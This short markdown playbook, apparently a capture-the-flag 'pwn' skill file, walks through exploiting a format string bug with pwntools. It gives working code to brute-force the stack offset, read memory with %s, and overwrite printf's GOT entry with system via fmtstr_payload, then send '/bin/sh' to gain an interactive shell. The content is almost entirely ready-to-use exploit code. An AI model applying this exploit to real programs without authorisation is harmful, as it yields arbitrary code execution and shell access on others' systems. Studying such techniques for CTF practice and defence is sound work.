# Format String Exploitation Playbook (skills/pwn/format-string.md)

## 1. Offset Identification

Send `%p.` repeated or `%1$p` pattern:
```python
def find_offset(io):
    for i in range(1, 40):
        io.sendline(f"AAAA%{i}$p".encode())
        res = io.recvline()
        if b"0x41414141" in res:
            log.success(f"Format string offset found at index: {i}")
            return i
```

---

## 2. Memory Leakage & Arbitrary Write

### 2.1 Arbitrary Read
- Print string at pointer: `%{offset}$s` (Ensure target address is on stack at the specified offset).

### 2.2 Arbitrary Write with `fmtstr_payload`
Pwntools provides an automated payload generator:
```python
# Write target_val to target_addr
writes = {
    elf.got['printf']: libc.sym['system'] # Overwrite printf@got with system
}

payload = fmtstr_payload(offset, writes, write_size='byte') # 'byte', 'short', or 'int'
io.sendline(payload)

# Next call: printf("/bin/sh") triggers system("/bin/sh")
io.sendline(b"/bin/sh\x00")
io.interactive()
```
